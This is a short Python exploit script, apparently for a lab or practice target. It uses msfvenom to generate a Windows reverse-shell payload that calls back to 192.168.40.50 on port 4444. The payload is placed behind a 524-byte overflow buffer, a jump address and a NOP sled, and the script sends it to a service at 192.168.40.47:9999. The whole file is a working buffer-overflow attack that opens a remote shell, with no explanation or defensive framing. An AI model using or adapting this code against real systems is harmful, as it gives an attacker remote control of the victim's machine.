import socket
import sys
import subprocess

buf = subprocess.check_output(['msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.50 LPORT=4444 -f raw -a x86 -b "\\x00"'],shell=True)
nop = b"\x90" * 32 
jmp_addr = b"\xf3\x12\x17\x31"
buffer = b"A"*524
payload = buffer + jmp_addr + nop + buf

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send(payload)  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
